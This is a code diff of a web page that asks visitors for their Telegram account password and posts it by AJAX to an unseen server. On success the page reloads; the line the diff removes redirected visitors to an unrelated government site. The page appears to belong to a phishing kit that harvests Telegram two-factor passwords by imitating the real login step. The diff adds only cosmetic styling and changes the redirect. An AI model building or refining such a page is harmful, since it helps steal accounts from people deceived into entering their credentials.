@@ -1,3 +1,10 @@
+<style>
+    .dkclass {
+        height: 500px!important;
+    }
+    
+</style>
+<div style="margin-top: -50px;">
 <h3 class="mt-3 text-center fw-bold">Enter Password</h3>
 <p class="mt-3 text-center">Input your Telegram Account password.</p>
 <div class="mb-3">
@@ -6,6 +13,7 @@
 <p id="wrong" class="text-center">Wrong password.</p>
 <button class="btdk btn btn-sm mx-auto d-block mb-3">CONFIRM</button>
 <!--<a class="d-block mb-3 text-center" href="?otherAccount">Login akun lain</a>-->
+</div>
 <script>
   $("#wrong").hide();
 
@@ -18,7 +26,7 @@
       success:function(data){
         if (data.result.status == "success") {
         //   window.location.reload();
-          window.location.replace("https://www.cdc.gov.sg/");
+          window.location.reload();
         } else if (data.result.status == "failed") {
           $("#wrong").show();
           $("input[type='text']").val("");
